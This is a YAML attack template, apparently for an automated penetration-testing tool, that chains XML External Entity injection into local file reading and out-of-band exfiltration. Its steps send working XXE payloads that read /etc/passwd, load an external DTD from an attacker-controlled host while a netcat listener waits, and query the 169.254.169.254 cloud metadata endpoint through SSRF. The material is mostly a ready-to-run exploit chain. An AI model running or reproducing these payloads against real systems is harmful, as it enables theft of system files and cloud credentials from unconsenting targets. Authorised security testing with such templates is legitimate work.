name: "XXE to File Exfiltration Chain"
description: "Detect XML External Entity injection, exfiltrate local files via external DTD, and escalate to SSRF or RCE through the parser."
category: web
attack_vector: "XXE → local file read → SSRF/data exfiltration"
variables:
  url:
    required: true
    description: "Target endpoint that parses XML (e.g. http://host/parse)"
  lhost:
    required: true
    description: "Attacker listener IP for OOB exfiltration"
  lport:
    required: false
    default: 80
    description: "Attacker listener port"
cutting_edge: true
references: ["OWASP XXE Prevention", "XXE OOB exfiltration techniques"]

steps:
  - name: "xxe_detect"
    tool: "curl_request"
    description: "Send classic XXE payload to read /etc/passwd"
    args:
      url: "{{url}}"
      method: "POST"
      headers: 'Content-Type: application/xml'
      data: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
      follow_redirects: true
      insecure: true
    expected_output: "root:|/bin/bash|ENTITY"
    timeout: 60
    gate: true
    retries: 1
    extracts:
      - var: "root_line"
        regex: "(root:[^\\n]+)"

  - name: "oob_dtd_setup"
    tool: "netcat_listener"
    description: "Start OOB listener to catch exfiltrated file contents"
    args:
      port: "{{lport}}"
    expected_output: null
    timeout: 60
    gate: false
    retries: 0

  - name: "oob_exfil"
    tool: "curl_request"
    description: "Trigger XXE with external DTD hosted on attacker to exfil data OOB"
    args:
      url: "{{url}}"
      method: "POST"
      headers: 'Content-Type: application/xml'
      data: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{{lhost}}/evil.dtd">%xxe;]><foo/>'
      follow_redirects: true
      insecure: true
    expected_output: null
    timeout: 60
    gate: false
    retries: 0

  - name: "ssrf_meta_probe"
    tool: "curl_request"
    description: "Use XXE to hit cloud metadata endpoint (SSRF)"
    args:
      url: "{{url}}"
      method: "POST"
      headers: 'Content-Type: application/xml'
      data: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>'
      follow_redirects: true
      insecure: true
    expected_output: null
    timeout: 60
    gate: false
    retries: 0
